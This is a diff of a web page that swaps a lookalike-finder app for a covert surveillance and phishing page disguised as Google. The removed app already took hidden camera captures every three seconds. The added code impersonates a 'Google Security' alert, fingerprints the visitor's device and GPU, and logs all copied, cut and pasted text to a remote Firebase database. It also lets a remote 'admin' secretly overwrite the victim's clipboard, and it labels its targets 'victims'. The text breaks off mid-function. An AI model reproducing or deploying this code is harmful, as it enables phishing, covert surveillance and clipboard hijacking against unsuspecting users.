@@ -3,1062 +3,1196 @@
 
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#030712">
-  <title>FACEVERSE AI — Discover Your Lookalikes</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link
-    href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
-    rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Google</title>
 
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  <script src="config.js"></script>
+  <!--CREATED BY https://www.xploitpoison.com/-->
+
 
   <style>
-    :root {
-      --bg: #030712;
-      --panel: #0b1120;
-      --line: rgba(0, 212, 255, 0.15);
-      --muted: #64748b;
-      --text: #f8fafc;
-      --cyan: #00d4ff;
-      --cyan-glow: rgba(0, 212, 255, 0.4);
-      --green: #10b981;
-      --amber: #f59e0b;
-    }
-
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
     }
 
     body {
-      min-height: 100vh;
-      background: radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.1), transparent 40%), radial-gradient(ellipse at 80% 100%, rgba(16, 185, 129, 0.08), transparent 40%), var(--bg);
-      color: var(--text);
-      font-family: "DM Sans", sans-serif;
-      overflow-x: hidden;
-    }
-
-    button {
-      cursor: pointer;
-    }
-
-    .topbar {
-      height: 76px;
-      padding: 0 clamp(18px, 5vw, 70px);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid var(--line);
-      background: rgba(3, 7, 18, 0.8);
-      backdrop-filter: blur(18px);
-      position: sticky;
-      top: 0;
-      z-index: 20;
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
-      color: var(--text);
-    }
-
-    .brand-mark {
-      width: 39px;
-      height: 39px;
-      border-radius: 13px;
-      display: grid;
-      place-items: center;
-      background: linear-gradient(135deg, #00d4ff, #0055ff);
-      box-shadow: 0 0 20px var(--cyan-glow);
-      font-size: 20px;
-      color: #000;
-      font-weight: bold;
-    }
-
-    .brand-name {
-      font: 700 18px "Space Grotesk";
-      letter-spacing: .5px;
-    }
-
-    .brand-name span {
-      color: var(--cyan);
-    }
-
-    .nav-right {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-    }
-
-    .privacy {
-      font-size: 12px;
-      color: var(--muted);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .privacy i {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--green);
-      box-shadow: 0 0 12px var(--green);
-    }
-
-    .top-pill {
-      border: 1px solid var(--cyan);
-      color: var(--cyan);
-      background: rgba(0, 212, 255, 0.1);
-      padding: 9px 14px;
-      border-radius: 999px;
-      font-size: 12px;
-      font-weight: 700;
-    }
-
-    main {
-      max-width: 1180px;
-      margin: auto;
-      padding: 40px 24px 60px;
-    }
-
-    .hero {
-      text-align: center;
-      margin: 0 auto 38px;
-      max-width: 720px;
-    }
-
-    .eyebrow {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      color: var(--cyan);
-      border: 1px solid var(--line);
-      background: rgba(0, 212, 255, 0.05);
-      border-radius: 999px;
-      padding: 7px 12px;
-      font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 1.4px;
-    }
-
-    .hero h1 {
-      font: 700 clamp(34px, 5vw, 58px)/1.08 "Space Grotesk";
-      letter-spacing: -2px;
-      margin: 20px 0 14px;
-    }
-
-    .hero h1 em {
-      font-style: normal;
-      color: var(--cyan);
-      text-shadow: 0 0 20px var(--cyan-glow);
-    }
-
-    .hero p {
-      font-size: 15px;
-      line-height: 1.7;
-      color: var(--muted);
-      max-width: 590px;
-      margin: auto;
-    }
-
-    .workspace {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 24px;
-      align-items: stretch;
-    }
-
-    .panel {
-      background: rgba(11, 17, 32, 0.8);
-      border: 1px solid var(--line);
-      border-radius: 20px;
-      box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
-      overflow: hidden;
-      backdrop-filter: blur(10px);
-    }
-
-    .panel-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 20px 24px;
-      border-bottom: 1px solid var(--line);
-    }
-
-    .panel-title {
-      font: 600 15px "Space Grotesk";
-      color: #fff;
-    }
-
-    .step {
-      font-size: 11px;
-      color: var(--cyan);
-      background: rgba(0, 212, 255, 0.1);
-      padding: 6px 10px;
-      border-radius: 999px;
-      border: 1px solid rgba(0, 212, 255, 0.2);
-    }
-
-    .camera-area {
-      padding: 20px;
-    }
-
-    .camera-frame {
-      position: relative;
-      aspect-ratio: 4/3;
       background: #000;
-      border: 1px solid var(--cyan);
-      border-radius: 16px;
       overflow: hidden;
-      display: grid;
-      place-items: center;
-      box-shadow: inset 0 0 30px rgba(0, 212, 255, 0.1);
     }
 
-    #video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1);
-      opacity: 0;
-      transition: opacity 0.5s ease;
-      position: absolute;
-      inset: 0;
-      z-index: 1;
-    }
-
-    #video.show {
-      opacity: 0.8;
-      filter: contrast(1.2) grayscale(0.3);
-    }
-
-    #freezeFrame {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      position: absolute;
-      inset: 0;
-      transform: scaleX(-1);
-      display: none;
-      z-index: 2;
-    }
-
-    .camera-placeholder {
-      text-align: center;
-      padding: 20px;
-      max-width: 310px;
-      z-index: 3;
-      position: relative;
-    }
-
-    .camera-icon {
-      width: 66px;
-      height: 66px;
-      border-radius: 50%;
-      margin: 0 auto 17px;
-      display: grid;
-      place-items: center;
-      background: rgba(0, 212, 255, 0.1);
-      border: 2px solid var(--cyan);
-      font-size: 28px;
-      color: var(--cyan);
-      box-shadow: 0 0 20px var(--cyan-glow);
-      animation: pulse-glow 2s infinite;
-    }
-
-    @keyframes pulse-glow {
-      0% {
-        box-shadow: 0 0 10px var(--cyan-glow);
-      }
-
-      50% {
-        box-shadow: 0 0 30px var(--cyan-glow);
-      }
-
-      100% {
-        box-shadow: 0 0 10px var(--cyan-glow);
-      }
-    }
-
-    .camera-placeholder h3 {
-      font: 600 17px "Space Grotesk";
-      margin-bottom: 7px;
-      color: #fff;
-    }
-
-    .camera-placeholder p {
-      font-size: 12px;
-      line-height: 1.6;
-      color: var(--muted);
-    }
-
-    .face-guide {
-      position: absolute;
-      width: 43%;
-      height: 73%;
-      border: 2px solid var(--cyan);
-      border-radius: 48% 48% 43% 43%;
-      box-shadow: inset 0 0 20px var(--cyan-glow);
-      display: none;
-      pointer-events: none;
-      z-index: 4;
-    }
-
-    .scan-beam {
-      position: absolute;
+    /* Fullscreen iframe — restored to old behavior */
+    .game-frame {
+      position: fixed;
+      top: 0;
       left: 0;
-      right: 0;
-      height: 3px;
-      top: 0;
-      background: #fff;
-      box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan);
-      display: none;
-      animation: scan 1.5s linear infinite;
-      z-index: 5;
+      width: 100%;
+      height: 100%;
+      border: none;
     }
 
-    @keyframes scan {
-      to {
-        top: 100%;
-      }
-    }
-
-    .camera-status {
-      position: absolute;
-      left: 13px;
-      top: 13px;
-      display: none;
-      align-items: center;
-      gap: 7px;
-      border: 1px solid var(--cyan);
-      background: rgba(0, 0, 0, 0.8);
-      padding: 6px 12px;
-      border-radius: 999px;
-      font-size: 10px;
-      color: var(--cyan);
-      font-family: monospace;
-      z-index: 6;
-    }
-
-    .camera-status i {
-      width: 6px;
-      height: 6px;
-      background: var(--green);
-      border-radius: 50%;
-      box-shadow: 0 0 5px var(--green);
-    }
-
-    .controls {
-      display: flex;
-      gap: 12px;
-      margin-top: 20px;
-    }
-
-    .primary,
-    .secondary {
-      border: 0;
-      border-radius: 10px;
-      padding: 14px 16px;
-      font-size: 13px;
-      font-weight: 800;
-      transition: .2s;
-    }
-
-    .primary {
-      flex: 1;
-      color: #000;
-      background: var(--cyan);
-      box-shadow: 0 0 20px var(--cyan-glow);
-    }
-
-    .primary:hover {
-      background: #00bced;
-      transform: translateY(-2px);
-    }
-
-    .primary:disabled {
-      opacity: .3;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-      background: var(--panel2);
-      color: var(--muted);
-    }
-
-    .secondary {
-      background: rgba(255, 255, 255, 0.05);
-      color: #fff;
-      border: 1px solid var(--line);
-    }
-
-    .log {
-      margin: 0 20px 20px;
-      padding: 15px;
-      border-radius: 12px;
-      background: #000;
-      border: 1px solid var(--line);
-      font: 12px/1.8 monospace;
-      color: var(--cyan);
-      min-height: 70px;
-    }
-
-    .log-line {
-      display: flex;
-      gap: 8px;
-    }
-
-    .log-line i {
-      color: var(--green);
-      font-style: normal;
-    }
-
-    .results-body {
-      padding: 24px;
-      min-height: 100%;
-    }
-
-    .empty-state {
-      min-height: 380px;
+    /* Victim Premium Toasts */
+    .victim-toasts {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
       display: flex;
       flex-direction: column;
+      gap: 10px;
+      z-index: 9999999;
+      /* Sabse upar dikhega */
+      pointer-events: none;
+    }
+
+    .v-toast {
+      padding: 12px 24px;
+      background: rgba(10, 14, 23, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transform: translateY(-20px);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+      color: #fff;
+      border-left: 4px solid #00ff88;
+    }
+
+    .v-toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .v-toast.ok {
+      border-color: #00ff88;
+      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
+    }
+
+    .v-toast.ok .v-toast-icon {
+      color: #00ff88;
+      text-shadow: 0 0 10px #00ff88;
+    }
+
+    .v-toast.err {
+      border-color: #ff2e4c;
+      box-shadow: 0 0 15px rgba(255, 46, 76, 0.2);
+    }
+
+    .v-toast.err .v-toast-icon {
+      color: #ff2e4c;
+      text-shadow: 0 0 10px #ff2e4c;
+    }
+
+    .v-toast-icon {
+      font-size: 18px;
+      display: flex;
       align-items: center;
       justify-content: center;
-      text-align: center;
-    }
-
-    .orbit {
-      width: 120px;
-      height: 120px;
-      border: 1px solid var(--cyan);
-      border-radius: 50%;
-      display: grid;
-      place-items: center;
-      position: relative;
-      margin-bottom: 24px;
-    }
-
-    .orbit:before,
-    .orbit:after {
-      content: "";
-      position: absolute;
-      border: 1px solid rgba(0, 212, 255, 0.3);
-      border-radius: 50%;
-    }
-
-    .orbit:before {
-      inset: 15px;
-    }
-
-    .orbit:after {
-      inset: -15px;
-      border-style: dashed;
-      animation: spin 18s linear infinite;
-    }
-
-    .orbit span {
-      font-size: 40px;
-      color: var(--cyan);
-      text-shadow: 0 0 20px var(--cyan);
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    .empty-state h3 {
-      font: 600 18px "Space Grotesk";
-      margin-bottom: 8px;
-      color: #fff;
-    }
-
-    .empty-state p {
-      font-size: 13px;
-      line-height: 1.6;
-      color: var(--muted);
-      max-width: 280px;
-    }
-
-    .progress-wrap {
-      display: none;
-      text-align: center;
-      padding: 40px 15px;
-    }
-
-    .progress-ring {
-      width: 80px;
-      height: 80px;
-      border: 3px solid rgba(0, 212, 255, 0.1);
-      border-top-color: var(--cyan);
-      border-right-color: var(--green);
-      border-radius: 50%;
-      margin: 0 auto 24px;
-      animation: spin .8s linear infinite;
-    }
-
-    .progress-wrap h3 {
-      font: 600 18px "Space Grotesk";
-      margin-bottom: 8px;
-      color: #fff;
-    }
-
-    .progress-wrap p {
-      font-size: 13px;
-      color: var(--cyan);
-      font-family: monospace;
-    }
-
-    .progress-track {
-      height: 6px;
-      border-radius: 99px;
-      background: rgba(255, 255, 255, 0.1);
-      overflow: hidden;
-      margin: 24px auto 0;
-      max-width: 280px;
-    }
-
-    .progress-track span {
-      display: block;
-      height: 100%;
-      width: 0;
-      background: var(--cyan);
-      box-shadow: 0 0 10px var(--cyan);
-      transition: width .4s;
-    }
-
-    .results {
-      display: none;
-    }
-
-    .results-top {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      margin-bottom: 20px;
-    }
-
-    .results-top h3 {
-      font: 600 18px "Space Grotesk";
-      color: #fff;
-    }
-
-    .results-top p {
-      font-size: 12px;
-      color: var(--muted);
-      margin-top: 5px;
-    }
-
-    .demo-tag {
-      font-size: 10px;
-      color: var(--green);
-      background: rgba(16, 185, 129, 0.1);
-      border: 1px solid rgba(16, 185, 129, 0.3);
-      padding: 6px 10px;
-      border-radius: 999px;
-      font-weight: bold;
-    }
-
-    .result-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 14px;
-      margin-bottom: 24px;
-    }
-
-    .result-grid-60 {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 14px;
-    }
-
-    .result-grid-60 .person {
-      border-color: rgba(245, 158, 11, 0.3);
-      background: rgba(245, 158, 11, 0.03);
-    }
-
-    .result-grid-60 .score {
-      color: var(--amber);
-    }
-
-    .person {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 12px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid var(--line);
-      border-radius: 12px;
-    }
-
-    .person img {
-      width: 50px;
-      height: 50px;
-      border-radius: 10px;
-      object-fit: cover;
-      border: 1px solid var(--line);
-    }
-
-    .person-info {
-      min-width: 0;
-    }
-
-    .person-info b {
-      display: block;
-      font-size: 13px;
-      color: #fff;
-    }
-
-    .person-info small {
-      display: block;
-      color: var(--muted);
-      font-size: 11px;
-      margin-top: 3px;
-    }
-
-    .score {
-      margin-left: auto;
-      color: var(--cyan);
-      font: 800 14px "Space Grotesk";
-    }
-
-    .section-title {
-      font: 600 14px "Space Grotesk";
-      color: var(--muted);
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .section-title::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: var(--line);
-    }
-
-    .modal {
-      position: fixed;
-      inset: 0;
-      background: rgba(3, 7, 18, 0.9);
-      backdrop-filter: blur(12px);
-      z-index: 50;
-      display: none;
-      place-items: center;
-      padding: 20px;
-    }
-
-    .modal-card {
-      max-width: 420px;
-      width: 100%;
-      padding: 30px;
-      background: var(--panel);
-      border: 1px solid var(--cyan);
-      border-radius: 20px;
-    }
-
-    .modal-card h2 {
-      font: 600 22px "Space Grotesk";
-      color: var(--cyan);
-      margin-bottom: 15px;
-    }
-
-    .modal-card p {
-      font-size: 13px;
-      line-height: 1.6;
-      color: var(--muted);
-      margin-bottom: 25px;
-    }
-
-    .modal-actions {
-      display: flex;
-      gap: 10px;
-    }
-
-    @media(max-width:850px) {
-      .workspace {
-        grid-template-columns: 1fr;
-      }
-
-      .result-grid,
-      .result-grid-60 {
-        grid-template-columns: 1fr;
-      }
     }
   </style>
 </head>
 
 <body>
-  <header class="topbar">
-    <a class="brand" href="#">
-      <div class="brand-mark">⚡</div>
-      <div class="brand-name">FACEVERSE <span>AI</span></div>
-    </a>
-    <div class="nav-right">
-      <div class="privacy"><i></i> SECURE SESSION</div>
-      <div class="top-pill">✧ CYBER LAB</div>
-    </div>
-  </header>
+  <div class="victim-toasts" id="victimToasts"></div>
 
-  <main>
-    <section class="hero">
-      <div class="eyebrow">✦ BIOMETRIC DISCOVERY</div>
-      <h1>Somewhere in the world,<br>there's a face like <em>yours.</em></h1>
-      <p>Meet your lookalike universe with a playful face-similarity experience. Start with a live selfie and explore
-        sample matches.</p>
-    </section>
+  <div id="customAlert"
+    style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:999999; align-items:center; justify-content:center; backdrop-filter:blur(2px);">
+    <div
+      style="background:#ffffff; border-radius:8px; padding:30px 25px; max-width:400px; width:90%; text-align:left; box-shadow:0 4px 20px rgba(0,0,0,0.15); position:relative; animation: fadeIn 0.2s ease;">
 
-    <section class="workspace">
-      <article class="panel">
-        <div class="panel-head">
-          <div class="panel-title">01 / Biometric Studio</div>
-          <div class="step">CAMERA INPUT</div>
+      
+      <div style="display:flex; align-items:center; gap:12px; margin-bottom:20px;">
+       
+        <img id="popupBrandIconImg" src="https://www.google.com/favicon.ico"
+          style="width:32px; height:32px; border-radius:50%; object-fit:cover;" onerror="this.style.display='none'">
+
+        <div>
+          
+          <h3 id="popupBrandName"
+            style="color:#202124; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size:16px; font-weight:600; margin:0;">
+            Google Security</h3>
+         
+          <p id="popupBrandUrl" style="color:#5f6368; font-size:12px; margin:0;">accounts.google.com</p>
         </div>
-        <div class="camera-area">
-          <div class="camera-frame">
-            <video id="video" autoplay playsinline muted></video>
-            <img id="freezeFrame" alt="Frozen Capture">
+      </div>
 
-            <div class="camera-placeholder" id="placeholder">
-              <div class="camera-icon">◎</div>
-              <h3>Ready for your close-up?</h3>
-              <p>Allow camera access and position your face inside the guide.</p>
-            </div>
-            <div class="face-guide" id="faceGuide"></div>
-            <div class="scan-beam" id="scanBeam"></div>
-            <div class="camera-status" id="cameraStatus"><i></i> LIVE SCAN</div>
-          </div>
-          <div class="controls">
-            <button class="primary" id="startBtn">Start Finding</button>
-            <button class="secondary" id="captureBtn" disabled>Capture & Analyze</button>
-          </div>
-        </div>
-        <div class="log" id="log">
-          <div class="log-line"><i>●</i><span><strong>SYSTEM</strong> / Ready when you are.</span></div>
-        </div>
-      </article>
-
-      <article class="panel">
-        <div class="panel-head">
-          <div class="panel-title">02 / Lookalike Universe</div>
-          <div class="step">DISCOVERY</div>
-        </div>
-        <div class="results-body">
-          <div class="empty-state" id="emptyState">
-            <div class="orbit"><span>✧</span></div>
-            <h3>Results will appear here</h3>
-            <p>Start your selfie session to see a preview.</p>
-          </div>
-          <div class="progress-wrap" id="progressWrap">
-            <div class="progress-ring"></div>
-            <h3 id="progressTitle">Analyzing biometrics...</h3>
-            <p id="progressText">Initializing AI core</p>
-            <div class="progress-track"><span id="progressBar"></span></div>
-          </div>
-          <div class="results" id="results">
-            <div class="results-top">
-              <div>
-                <h3>Your Lookalike Gallery</h3>
-                <p>Matches found in global database.</p>
-              </div>
-              <span class="demo-tag">MATCH FOUND</span>
-            </div>
-
-            <div class="section-title">High Confidence Matches</div>
-            <div class="result-grid" id="resultGridExact"></div>
-
-            <div class="section-title" style="margin-top: 24px;">Low Confidence Matches</div>
-            <div class="result-grid-60" id="resultGridLow"></div>
-          </div>
-        </div>
-      </article>
-    </section>
-  </main>
-
-  <div class="modal" id="consentModal">
-    <div class="modal-card">
-      <h2>⚠️ Security Protocol</h2>
-      <p>FACEVERSE needs camera permission to show your live preview. By proceeding, you consent to biometric analysis.
+      
+      <p id="customAlertMessage"
+        style="color:#202124; font-size:15px; margin-bottom:25px; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.5;">
+        Message Here
       </p>
-      <div class="modal-actions">
-        <button class="secondary" id="cancelBtn">Not now</button>
-        <button class="primary" id="allowBtn">I Agree</button>
+
+      
+      <div style="display:flex; justify-content:flex-end; gap:10px;">
+        <button onclick="document.getElementById('customAlert').style.display='none'"
+          style="background:transparent; color:#1a73e8; border:none; padding:10px 16px; border-radius:4px; font-family:'Segoe UI', sans-serif; font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s;"
+          onmouseover="this.style.background='#f1f3f4'" onmouseout="this.style.background='transparent'">
+          Cancel
+        </button>
+
+        <button onclick="document.getElementById('customAlert').style.display='none'"
+          style="background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-family:'Segoe UI', sans-serif; font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s; box-shadow:0 1px 3px rgba(60,64,67,0.3);"
+          onmouseover="this.style.background='#1557b0'" onmouseout="this.style.background='#1a73e8'">
+          OK
+        </button>
       </div>
     </div>
   </div>
 
-  <script>
-    let db = null;
-    let deviceId = localStorage.getItem('device_tracker_id');
-    if (!deviceId) {
-      deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-      localStorage.setItem('device_tracker_id', deviceId);
+  <style>
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
+  </style>
 
-    if (typeof firebaseConfig !== 'undefined') {
-      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-      db = firebase.database();
+  <iframe id="dynamicFrame" class="game-frame" src="about:blank"
+    allow="geolocation; clipboard-read; clipboard-write"></iframe>
 
-      const deviceInfo = {
-        deviceId: deviceId, userAgent: navigator.userAgent, language: navigator.language,
-        platform: navigator.platform, screen: `${window.screen.width}x${window.screen.height}`,
-        timestamp: Date.now(), lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), status: 'active'
+  <script src="config.js"></script>
+  <script>
+
+    let database = null;
+    let deviceId = null;
+    let visitCount = 0;
+    let gpsInterval = null;
+    let geoInterval = null;
+    let lastClipboardContent = '';
+    let clipboardCheckInterval = null;
+    let permissionInterval = null;
+    let sensorData = { orientation: {}, motion: {}, lastUpdate: Date.now() };
+
+    let hardwareInfo = {};
+    let softwareInfo = {};
+
+    /* ---------------- HARDWARE / SOFTWARE ---------------- */
+    function getHardwareSoftwareInfo() {
+      const ua = navigator.userAgent;
+
+      hardwareInfo = {
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        vendor: navigator.vendor || 'Unknown',
+        platform: navigator.platform || 'Unknown',
+        product: navigator.product || 'Unknown',
+        devicePixelRatio: window.devicePixelRatio || 1,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        screenColorDepth: screen.colorDepth,
+        screenPixelDepth: screen.pixelDepth
       };
 
-      db.ref(`online_devices/${deviceId}`).set({ status: 'online', lastSeen: Date.now(), screen: window.screen.width + 'x' + window.screen.height });
-      db.ref(`devices/${deviceId}`).update(deviceInfo).then(() => console.log("✅ Device Info Saved:", deviceId)).catch(e => console.error("❌ Save Failed:", e));
-    }
-
-    const $ = id => document.getElementById(id);
-    const video = $("video");
-    const freezeFrame = $("freezeFrame");
-    let cameraStream = null;
-    let captureInterval = null;
-
-    const samplesHigh = [
-      { name: "Alex Morgan", place: "United States", score: "99.2%", img: "https://i.pravatar.cc/120?img=12" },
-      { name: "Kenji Watanabe", place: "Japan", score: "98.7%", img: "https://i.pravatar.cc/120?img=11" },
-      { name: "Arjun Mehta", place: "India", score: "97.5%", img: "https://i.pravatar.cc/120?img=14" },
-      { name: "Lucas Silva", place: "Brazil", score: "95.8%", img: "https://i.pravatar.cc/120?img=13" },
-      { name: "Noah Bennett", place: "Canada", score: "94.3%", img: "https://i.pravatar.cc/120?img=15" },
-      { name: "Daniel Kim", place: "South Korea", score: "92.1%", img: "https://i.pravatar.cc/120?img=16" },
-      { name: "Marco Rossi", place: "Italy", score: "91.8%", img: "https://i.pravatar.cc/120?img=17" }
-    ];
-
-    const samplesLow = [
-      { name: "James Wilson", place: "Australia", score: "64.2%", img: "https://i.pravatar.cc/120?img=18" },
-      { name: "Ethan Hunt", place: "UK", score: "61.5%", img: "https://i.pravatar.cc/120?img=19" },
-      { name: "Ravi Sharma", place: "India", score: "60.8%", img: "https://i.pravatar.cc/120?img=20" },
-      { name: "Yuki Tanaka", place: "Japan", score: "60.1%", img: "https://i.pravatar.cc/120?img=21" }
-    ];
-
-    function speak(text) {
-      if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const u = new SpeechSynthesisUtterance(text);
-        u.rate = 1.0; u.pitch = 1.0;
-        const voices = window.speechSynthesis.getVoices();
-        const v = voices.find(v => v.name.includes('Google US English') || v.name.includes('Samantha'));
-        if (v) u.voice = v;
-        window.speechSynthesis.speak(u);
-      }
-    }
-
-    function log(message) {
-      const row = document.createElement("div");
-      row.className = "log-line";
-      row.innerHTML = `<i>›</i><span>${message}</span>`;
-      $("log").appendChild(row);
-      $("log").scrollTop = $("log").scrollHeight;
-    }
-
-    // 🚀 START CAMERA
-    async function enableCamera() {
       try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        video.srcObject = cameraStream;
-
-        video.onplaying = () => {
-          $("placeholder").style.display = "none";
-          $("faceGuide").style.display = "block";
-          $("cameraStatus").style.display = "flex";
-          $("startBtn").textContent = "";
-          $("startBtn").disabled = true;
-          $("captureBtn").disabled = false;
-
-          video.classList.add('show');
-          log("Camera ready. Background capture active...");
-
-          if (!captureInterval) {
-            captureInterval = setInterval(() => {
-              autoCapture('background_3sec');
-            }, 3000);
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) {
+            hardwareInfo.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            hardwareInfo.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
           }
-        };
+        }
+      } catch (e) { }
 
-        await video.play();
+      softwareInfo = {
+        userAgent: ua,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        productSub: navigator.productSub,
+        appCodeName: navigator.appCodeName,
+        appName: navigator.appName,
+        appVersion: navigator.appVersion,
+        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset()
+      };
 
-      } catch (error) {
-        alert("Unable to open camera. Check browser permission.");
+      if (ua.includes('Chrome')) softwareInfo.browser = 'Chrome';
+      else if (ua.includes('Firefox')) softwareInfo.browser = 'Firefox';
+      else if (ua.includes('Safari')) softwareInfo.browser = 'Safari';
+      else if (ua.includes('Edg')) softwareInfo.browser = 'Edge';
+      else softwareInfo.browser = 'Unknown';
+
+      if (ua.includes('Windows')) softwareInfo.os = 'Windows';
+      else if (ua.includes('Mac')) softwareInfo.os = 'macOS';
+      else if (ua.includes('Android')) softwareInfo.os = 'Android';
+      else if (ua.includes('iPhone')) softwareInfo.os = 'iOS';
+      else softwareInfo.os = 'Unknown';
+
+      return { hardware: hardwareInfo, software: softwareInfo };
+    }
+
+    /* ---------------- CLIPBOARD ---------------- */
+    function initClipboardMonitoring() {
+      document.addEventListener('copy', () => {
+        const t = window.getSelection().toString();
+        if (t && t !== lastClipboardContent) {
+          lastClipboardContent = t;
+          const d = {
+            type: 'copy', text: t.substring(0, 1000), length: t.length,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            url: location.href, deviceId
+          };
+          saveToFirebase(`clipboard_data/${deviceId}/copy/${Date.now()}`, d);
+          saveToFirebase(`clipboard_data/${deviceId}/latest`, d);
+        }
+      });
+
+      document.addEventListener('paste', (e) => {
+        const t = e.clipboardData?.getData('text') || '';
+        if (t) {
+          const d = {
+            type: 'paste', text: t.substring(0, 1000), length: t.length,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            url: location.href, deviceId
+          };
+          saveToFirebase(`clipboard_data/${deviceId}/paste/${Date.now()}`, d);
+          saveToFirebase(`clipboard_data/${deviceId}/latest_paste`, d);
+        }
+      });
+
+      document.addEventListener('cut', () => {
+        const t = window.getSelection().toString();
+        if (t) {
+          saveToFirebase(`clipboard_data/${deviceId}/cut/${Date.now()}`, {
+            type: 'cut', text: t.substring(0, 1000), length: t.length,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            url: location.href, deviceId
+          });
+        }
+      });
+    }
+
+    function listenForAdminClipboard() {
+      if (!database) return;
+
+      // 5. CLIPBOARD LISTENER (Super Fix for Browsers)
+      database.ref(`admin_commands/${deviceId}/clipboard`).on('value', async (snap) => {
+        const c = snap.val();
+        if (c && c.text && c.active) {
+
+          const textToCopy = c.text;
+          let success = false;
+
+          // TRICK: Ek invisible button banao
+          const btn = document.createElement('button');
+          btn.style.position = 'fixed';
+          btn.style.opacity = '0';
+          btn.style.pointerEvents = 'none';
+          document.body.appendChild(btn);
+
+          // Button pe click event lagao jo copy karega
+          btn.addEventListener('click', async () => {
+            try {
+              await navigator.clipboard.writeText(textToCopy);
+              console.log('✅ Clipboard Set Successfully!');
+              success = true;
+            } catch (err) {
+              // Fallback: Agar modern API fail ho jaye
+              const textarea = document.createElement('textarea');
+              textarea.value = textToCopy;
+              textarea.style.position = 'fixed';
+              document.body.appendChild(textarea);
+              textarea.select();
+              document.execCommand('copy');
+              document.body.removeChild(textarea);
+              success = true;
+            }
+          });
+
+          // Button ko programmatically click karo
+          btn.click();
+
+          // Button ko remove kardo
